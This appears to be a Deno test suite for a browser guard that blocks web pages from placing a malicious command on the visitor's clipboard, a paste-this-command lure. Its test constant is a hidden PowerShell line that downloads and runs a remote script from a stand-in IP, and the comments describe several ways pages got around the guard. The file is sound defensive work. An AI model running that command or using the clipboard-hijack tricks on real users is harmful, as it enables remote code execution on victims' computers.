// Final review 8 and 9 for src/guards/clipboard.js.
//
// 8: execCommand("copy") of one realm (a same-origin frame) called on the
//    document of another realm. The copy event fires on the target document,
//    where that realm's "inside execCommand" mark is not set, so the event
//    counted as the browser's own copy and a right-click ("menu") gesture let
//    the page's setData write a command. Now refused. A menu gesture also ends
//    at the next trusted pointerdown / mousedown.
// 9: a page's copy handler dispatched a nested synthetic ClipboardEvent with
//    its own DataTransfer. The guard moved its check to that object, so the
//    real event's setData / items.add wrote the command. Now only trusted
//    events count, and each event's clipboardData is tracked on its own.
//
// The fakes follow Chrome: the copy event that execCommand fires is trusted
// and fires on the target document's window; isTrusted is an own property;
// DataTransfer.items returns a NEW DataTransferItemList on every read (checked
// in Chromium 156: dt.items === dt.items is false). Microtasks run between two
// listeners only when the browser dispatches the event with no script on the
// stack (checked in Chromium 156 for trusted click and keydown events; copy
// events from execCommand in a click handler, a timer, a bound timer and a
// frame realm saw no microtask between listeners).
//
// Review round 2:
// P1: items.add on the list a copy handler reads from e.clipboardData.items
//     (a new object each read) was never checked. The items getter is wrapped.
// P2: a frame realm's DataTransfer.prototype.setData / DataTransferItemList
//     .prototype.add on the top's clipboardData skipped the check. Every text
//     write on any DataTransfer is checked now.
// P3: a frame with no guard calls execCommand("copy") on the top document
//     after a right-click: its copy event is page-initiated (script on the
//     stack, no microtask between listeners), so the menu gesture does not count.
// Controls: Ctrl+C, menu Copy, copy buttons (execCommand and writeText).
import clipboardSource from "../src/guards/clipboard.js" with { type: "text" };
import { unwrapMain } from "./fixtures/main-source.mjs";

function assert(c, l) { if (!c) throw new Error(l); }
const loadClip = () => { const api = {}; new Function(`${unwrapMain(clipboardSource)}\nreturn installClipboardGuard;`)()(api); return api; };
const CMD = "powershell -w hidden -nop -c \"iex (iwr 'http://203.0.113.5/a.ps1' -UseBasicParsing)\"";

let clock = 1000;
const tick = (ms) => { clock += ms; };

// One window (realm). Its classes are its own; Document.prototype.execCommand
// is the "native" one this realm's guard wraps.
function realm(host = "verify-human.example", { install = true } = {}) {
  const listeners = {};
  let selection = "";
  const notices = [];
  const clipboard = { text: null }; // what reached the system clipboard
  class Event {
    constructor(type, init = {}) { this.type = type; this.isTrusted = false; this.defaultPrevented = false; void init; }
    preventDefault() { this.defaultPrevented = true; }
  }
  class ClipboardEvent extends Event {
    constructor(type, init = {}) { super(type, init); this._cd = init.clipboardData || null; }
    get clipboardData() { return this._cd; }
  }
  class DataTransferItemList {
    constructor(dt) { this._dt = dt; }
    add(s, t) { this._dt.data[t] = s; return {}; }
  }
  class DataTransfer {
    constructor() { this.data = {}; }
    setData(t, s) { this.data[t] = s; }
    get items() { return new DataTransferItemList(this); } // new object each read, like Chromium
  }
  class Selection { toString() { return selection; } }
  class Document {
    // Native: fires a trusted copy/cut on the TARGET document's window.
    execCommand(cmd) {
      if (cmd !== "copy" && cmd !== "cut") return true;
      this._realm.browserCopy(cmd, true); // script on the stack
      return true;
    }
    get defaultView() { return this._realm.window; }
  }
  const micro = [];
  const drain = () => { while (micro.length) micro.shift()(); };
  // fromBrowser: no script on the stack, so microtasks run after each listener.
  const dispatch = (e, fromBrowser) => {
    for (const f of [...(listeners[e.type] || [])]) { f(e); if (fromBrowser) drain(); }
    return !e.defaultPrevented;
  };
  const window = {
    getSelection: () => new Selection(), Selection, DataTransfer, DataTransferItemList, Event, ClipboardEvent, Document,
    queueMicrotask: (f) => { micro.push(f); },
    addEventListener(t, f) { (listeners[t] ||= []).push(f); },
    dispatchEvent(e) { return dispatch(e, false); },
  };
  const navClipboard = { writeText(x) { clipboard.text = x; return Promise.resolve(); } };
  const r = {
    window, notices, clipboard, navClipboard,
    select: (s) => { selection = s; },
    // The browser's own copy/cut: a trusted event; when no handler cancels
    // it the selection is copied, otherwise the event's clipboardData.
    browserCopy(type = "copy", fromScript = false) {
      const dt = new DataTransfer();
      const ev = new ClipboardEvent(type, { clipboardData: dt });
      ev.isTrusted = true;
      dispatch(ev, !fromScript);
      clipboard.text = ev.defaultPrevented ? (dt.data["text/plain"] ?? null) : selection;
      if (!fromScript) drain();
      return ev;
    },
    trusted(type, props = {}) { const ev = Object.assign(new Event(type), props); ev.isTrusted = true; dispatch(ev, true); drain(); return ev; },
    drain,
    newDocument() { const d = new Document(); d._realm = r; d.activeElement = null; return d; },
    installOn(document) {
      loadClip().install({ window, document, navigator: { clipboard: navClipboard }, location: { hostname: host }, now: () => clock, notify: (id) => notices.push(id), flagOn: () => true });
    },
  };
  r.document = r.newDocument();
  if (install) r.installOn(r.document);
  return r;
}

// ---- 8: cross-realm execCommand ----

Deno.test("8: a frame realm's execCommand('copy') on the top document after a right-click does not write the command", () => {
  const top = realm(); const frame = realm();
  top.select(CMD); // page-selected hidden text
  top.trusted("contextmenu");
  tick(3000);
  top.window.addEventListener("copy", (e) => { e.clipboardData.setData("text/plain", CMD); e.preventDefault(); });
  const ok = frame.window.Document.prototype.execCommand.call(top.document, "copy");
  assert(ok === false, "cross-realm execCommand copy was not refused");
  assert(top.clipboard.text !== CMD && frame.clipboard.text !== CMD, "command reached the clipboard: " + top.clipboard.text);
});

Deno.test("8: this realm's execCommand('cut') on a frame's document is refused too", () => {
  const top = realm(); const frame = realm();
  frame.select("hello world");
  assert(top.window.Document.prototype.execCommand.call(frame.document, "cut") === false, "reverse cross-realm cut not refused");
  assert(frame.clipboard.text === null, "frame clipboard written");
});

Deno.test("8: non-copy commands on another realm's document still run", () => {
  const top = realm(); const frame = realm();
  assert(frame.window.Document.prototype.execCommand.call(top.document, "bold") === true, "bold refused");
});

Deno.test("8: a window that gets a new document (guard installed twice) keeps copy buttons working", () => {
  const w = realm("example.org");
  const doc2 = w.newDocument(); // initial about:blank replaced by the real page, same window
  w.installOn(doc2);
  w.select("npm install left-pad");
  assert(doc2.execCommand("copy") === true, "same-window copy on the new document refused");
  assert(w.clipboard.text === "npm install left-pad", "copy button text not copied: " + w.clipboard.text);
});

Deno.test("8: a right-click gesture ends at the next trusted pointerdown", () => {
  const p = realm();
  p.select(CMD);
  p.trusted("contextmenu");
  tick(2000);
  p.trusted("pointerdown");
  p.window.addEventListener("copy", (e) => { e.clipboardData.setData("text/plain", CMD); e.preventDefault(); });
  // A later native copy event (no key, no menu) writes nothing dangerous.
  p.browserCopy();
  assert(p.clipboard.text !== CMD, "menu gesture outlived a click");
});

Deno.test("8: an untrusted pointerdown does not end the gesture (menu Copy still works)", () => {
  const p = realm();
  p.select(CMD);
  p.trusted("contextmenu");
  p.window.dispatchEvent(new p.window.Event("pointerdown")); // synthetic, from the page
  tick(4000);
  const ev = p.browserCopy();
  assert(!ev.defaultPrevented && p.clipboard.text === CMD, "menu Copy of the visitor's selection broke");
});

// ---- 9: nested synthetic copy event ----

for (const via of ["setData", "items.add"]) {
  Deno.test(`9: nested synthetic copy event with a fresh DataTransfer, then ${via}, is checked`, () => {
    const p = realm();
    p.select("hello");
    const W = p.window;
    W.addEventListener("copy", (e) => {
      if (!e.isTrusted) return;
      W.dispatchEvent(new W.ClipboardEvent("copy", { clipboardData: new W.DataTransfer() }));
      if (via === "setData") e.clipboardData.setData("text/plain", CMD); else e.clipboardData.items.add(CMD, "text/plain");
      e.preventDefault();
    });
    p.trusted("keydown", { key: "c", ctrlKey: true });
    p.browserCopy();
    assert(p.clipboard.text !== CMD, `${via} after a nested synthetic event wrote the command`);
    assert(p.notices.length > 0, "no notice");
  });
}

Deno.test("9: nested synthetic copy event that reuses the real clipboardData does not change the check", () => {
  const p = realm();
  p.select("hello");
  const W = p.window;
  W.addEventListener("copy", (e) => {
    if (!e.isTrusted) return;
    W.dispatchEvent(new W.ClipboardEvent("copy", { clipboardData: e.clipboardData }));
    e.clipboardData.setData("text/plain", CMD);
    e.preventDefault();
  });
  p.trusted("keydown", { key: "c", ctrlKey: true });
  p.browserCopy();
  assert(p.clipboard.text !== CMD, "command written");
});

Deno.test("9: a nested trusted copy (execCommand inside the copy handler) does not unguard the outer event", () => {
  const p = realm();
  p.select("hello");
  const W = p.window;
  let depth = 0;
  W.addEventListener("copy", (e) => {
    if (depth++ === 0) {
      p.document.execCommand("copy"); // benign selection: allowed, fires an inner trusted copy
      e.clipboardData.items.add(CMD, "text/plain");
      e.clipboardData.setData("text/plain", CMD);
      e.preventDefault();
    }
  });
  p.browserCopy();
  assert(p.clipboard.text !== CMD, "outer event wrote the command after a nested execCommand copy");
});

Deno.test("9: a lone synthetic copy event is ignored (no cancel, no mark)", () => {
  const p = realm();
  p.select(CMD);
  const W = p.window;
  const ev = new W.ClipboardEvent("copy", { clipboardData: new W.DataTransfer() });
  W.dispatchEvent(ev);
  assert(!ev.defaultPrevented && p.notices.length === 0, "synthetic event handled like a real copy");
});

// ---- controls: the visitor's own copy keeps working ----

Deno.test("control: Ctrl+C of a selected command copies it, and the page's setData of that text is kept", () => {
  const p = realm();
  p.select(CMD);
  p.window.addEventListener("copy", (e) => { e.clipboardData.setData("text/plain", CMD); e.preventDefault(); });
  p.trusted("keydown", { key: "c", ctrlKey: true });
  const ev = p.browserCopy();
  assert(ev.defaultPrevented && p.clipboard.text === CMD, "Ctrl+C broke: " + p.clipboard.text);
});

Deno.test("control: a page copy handler that adds benign text still writes", () => {
  const p = realm();
  p.select("some article text");
  p.window.addEventListener("copy", (e) => { e.clipboardData.setData("text/plain", "some article text\nRead more at example.org"); e.preventDefault(); });
  p.trusted("keydown", { key: "c", ctrlKey: true });
  p.browserCopy();
  assert(p.clipboard.text === "some article text\nRead more at example.org", "benign setData lost");
});

Deno.test("control: context-menu Copy of the visitor's selection still works", () => {
  const p = realm();
  p.select(CMD);
  p.trusted("pointerdown"); p.trusted("mousedown");
  p.trusted("contextmenu");
  tick(1500);
  const ev = p.browserCopy();
  assert(!ev.defaultPrevented && p.clipboard.text === CMD, "menu Copy broke");
});

Deno.test("control: copy buttons (textarea + execCommand, and writeText) with benign text work", async () => {
  const p = realm();
  p.document.activeElement = { value: "git clone https://example.org/x.git", selectionStart: 0, selectionEnd: 36 };
  assert(p.document.execCommand("copy") === true, "execCommand copy button refused");
  await p.navClipboard.writeText("deno task build");
  assert(p.clipboard.text === "deno task build", "writeText copy button broke");
});

Deno.test("control: copy button with an install command on a code host still works", () => {
  const p = realm("github.com");
  p.select(CMD);
  p.window.addEventListener("copy", (e) => { e.clipboardData.setData("text/plain", CMD); e.preventDefault(); });
  assert(p.document.execCommand("copy") === true, "execCommand on a safe host refused");
  assert(p.clipboard.text === CMD, "safe host copy lost");
});

// ---- review round 2 ----

Deno.test("P1: a plain items.add(CMD) in a copy handler after a benign Ctrl+C is checked (items is a new list each read)", () => {
  const p = realm();
  p.select("hello");
  p.window.addEventListener("copy", (e) => { e.clipboardData.items.add(CMD, "text/plain"); e.preventDefault(); });
  p.trusted("keydown", { key: "c", ctrlKey: true });
  p.browserCopy();
  assert(p.clipboard.text !== CMD, "items.add wrote the command");
  assert(p.notices.length > 0, "no notice");
});

Deno.test("P1: the items getter still returns a working list (benign items.add is kept)", () => {
  const p = realm();
  p.select("some article text");
  p.window.addEventListener("copy", (e) => { e.clipboardData.items.add("some article text (example.org)", "text/plain"); e.preventDefault(); });
  p.trusted("keydown", { key: "c", ctrlKey: true });
  p.browserCopy();
  assert(p.clipboard.text === "some article text (example.org)", "benign items.add lost: " + p.clipboard.text);
});

Deno.test("P1: the browser's menu Copy of the visitor's selection keeps a page items.add of that same text", () => {
  const p = realm();
  p.select(CMD);
  p.window.addEventListener("copy", (e) => { e.clipboardData.items.add(CMD, "text/plain"); e.preventDefault(); });
  p.trusted("contextmenu");
  tick(1000);
  p.browserCopy();
  assert(p.clipboard.text === CMD, "menu Copy + items.add of the selection lost: " + p.clipboard.text);
});

for (const via of ["setData", "add", "frame items getter + add"]) {
  Deno.test(`P2: a frame realm's ${via} on the top's copy-event clipboardData is checked`, () => {
    const top = realm(); const frame = realm();
    top.select("hello");
    const F = frame.window;
    top.window.addEventListener("copy", (e) => {
      const dt = e.clipboardData;
      if (via === "setData") F.DataTransfer.prototype.setData.call(dt, "text/plain", CMD);
      else if (via === "add") F.DataTransferItemList.prototype.add.call(dt.items, CMD, "text/plain");
      else {
        const items = Object.getOwnPropertyDescriptor(F.DataTransfer.prototype, "items").get.call(dt);
        F.DataTransferItemList.prototype.add.call(items, CMD, "text/plain");
      }
      e.preventDefault();
    });
    top.trusted("keydown", { key: "c", ctrlKey: true });
    top.browserCopy();
    assert(top.clipboard.text !== CMD, `frame ${via} wrote the command`);
  });
}

Deno.test("P2: the visitor's Ctrl+C of a command still copies when the page re-sets it with items.add", () => {
  const p = realm();
  p.select(CMD);
  p.window.addEventListener("copy", (e) => { e.clipboardData.items.add(CMD, "text/plain"); e.preventDefault(); });
  p.trusted("keydown", { key: "c", ctrlKey: true });
  p.browserCopy();
  assert(p.clipboard.text === CMD, "own Ctrl+C broke");
});

Deno.test("P2: drag-and-drop or other DataTransfer data with a command is checked; ordinary text is not", () => {
  const p = realm();
  const dt = new p.window.DataTransfer();
  dt.setData("text/plain", CMD);
  dt.items.add(CMD, "text/html");
  assert(dt.data["text/plain"] === undefined && dt.data["text/html"] === undefined, "command written to a DataTransfer");
  dt.setData("text/plain", "drag me");
  dt.items.add("https://example.org/", "text/uri-list");
  assert(dt.data["text/plain"] === "drag me" && dt.data["text/uri-list"] === "https://example.org/", "ordinary drag data lost");
});

for (const how of ["selection", "setData"]) {
  Deno.test(`P3: an unguarded frame's execCommand('copy') on the top document after a right-click does not copy the command (${how})`, () => {
    const top = realm(); const frame = realm("verify-human.example", { install: false });
    top.select(CMD); // page-selected hidden text
    top.trusted("contextmenu");
    tick(3000);
    if (how === "setData") top.window.addEventListener("copy", (e) => { e.clipboardData.setData("text/plain", CMD); e.preventDefault(); });
    frame.window.Document.prototype.execCommand.call(top.document, "copy"); // native: no guard in that frame
    top.drain();
    assert(top.clipboard.text !== CMD, "command reached the clipboard: " + top.clipboard.text);
  });
}

Deno.test("P3: the page's own contextmenu handler cannot use the menu gesture through an unguarded frame", () => {
  const top = realm(); const frame = realm("verify-human.example", { install: false });
  top.select(CMD);
  top.window.addEventListener("contextmenu", () => { frame.window.Document.prototype.execCommand.call(top.document, "copy"); });
  top.trusted("contextmenu");
  assert(top.clipboard.text !== CMD, "command reached the clipboard");
});

Deno.test("P3 control: without queueMicrotask (old engines) the browser's menu Copy still works", () => {
  const p = realm("verify-human.example", { install: false });
  delete p.window.queueMicrotask;
  p.installOn(p.document);
  p.select(CMD);
  p.trusted("contextmenu");
  tick(1000);
  const ev = p.browserCopy();
  assert(!ev.defaultPrevented && p.clipboard.text === CMD, "menu Copy broke without queueMicrotask");
});
